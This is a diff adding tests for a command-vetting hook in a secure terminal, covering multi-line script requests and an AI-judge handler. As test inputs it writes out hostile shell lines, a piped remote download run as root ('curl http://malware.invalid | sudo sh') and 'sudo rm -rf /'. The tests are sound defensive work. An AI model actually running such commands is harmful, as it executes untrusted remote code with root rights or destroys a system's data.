@@ -1403,6 +1403,24 @@ ok(HOOK.evaluate(_bad, 'x', on_error='allow')['verdict'] == 'allow'
    'malformed handler fails open (allow) with the error flagged')
 eq(HOOK.evaluate(_bad, 'x', on_error='block')['verdict'], 'block',
    'malformed handler fails closed when configured')
+# v2 multi-line contract: script=True sends a version-2 request carrying the whole
+# payload in `script`, with `command` mirroring it so a version-1 handler still sees
+# the content (and cannot fail open on an empty command).
+_H2 = _handler(
+    'r = json.load(sys.stdin)\n'
+    'v = "block" if (r.get("version") == 2 and "rm" in r.get("script", "")) else "allow"\n'
+    'print(json.dumps({"verdict": v,'
+    ' "message": "ver=%s has=%s" % (r.get("version"), "script" in r)}))')
+_v2 = HOOK.evaluate(_H2, 'cd /tmp\nrm x', script=True)
+ok(_v2['verdict'] == 'block' and _v2['message'] == 'ver=2 has=True',
+   'evaluate(script=True): a version-2 request carries the whole script in `script`')
+eq(HOOK.evaluate(_H2, 'ls')['message'], 'ver=1 has=False',
+   'evaluate() default: a version-1 request with no script field')
+_H1cmd = _handler(
+    'r = json.load(sys.stdin)\n'
+    'print(json.dumps({"verdict": "block" if "rm" in r.get("command", "") else "allow"}))')
+eq(HOOK.evaluate(_H1cmd, 'cd /tmp\nrm x', script=True)['verdict'], 'block',
+   'v2 mirrors the script into `command`, so a version-1 handler still sees it (fail closed)')
 # the shipped example handler blocks a remote script piped to a root shell
 _usr = HOOK.__file__
 for _ in range(5):
@@ -1412,6 +1430,11 @@ if os.path.exists(_ex):
     eq(HOOK.evaluate([sys.executable, _ex],
                      'curl http://malware.invalid | sudo sh')['verdict'], 'block',
        'example hook blocks curl | sudo sh')
+    # v2 script: the whole multi-line payload is judged, and a per-line-anchored rule
+    # (^\s*sudo, compiled re.MULTILINE) matches a dangerous line that is NOT the first.
+    eq(HOOK.evaluate([sys.executable, _ex],
+                     'echo hi\nsudo rm -rf /', script=True)['verdict'], 'ask',
+       'example hook judges the whole script; a ^-anchored rule matches a later line')
 # the AI-judge example handler: fast-path, escalation, AI verdict, fail-open
 import json as _json                               # noqa: E402
 _aij = os.path.join(_usr, 'share', 'secure-terminal', 'hooks', 'ai-judge-hook')
@@ -1442,6 +1465,14 @@ if os.path.exists(_aij):
     eq(_run_aij({'command': 'gpg x', 'transcript': 'y'},
                 ai='/nonexistent-ai-xyz')['verdict'], 'allow',
        'ai-judge fails open when the AI is unavailable')
+    # v2 script: a multi-line batch is judged whole. The trivial-allowlist shortcut is
+    # NEVER taken for a script (a trivial first line must not wave through a later one).
+    eq(_run_aij({'script': ''})['verdict'], 'allow',
+       'ai-judge: an all-blank script needs no AI call')
+    eq(_run_aij({'script': 'ls\ncp $SRC dest'})['verdict'], 'need_transcript',
+       'ai-judge: a contextual script escalates for the transcript')
+    eq(_run_aij({'script': 'ls\nsudo sh', 'transcript': 'x'})['verdict'], 'block',
+       'ai-judge: a script with a trivial first line is still judged whole by the AI')
     os.remove(_mockai)
 
 # --- line_edits=False makes escape-driven editing append-only -----------------
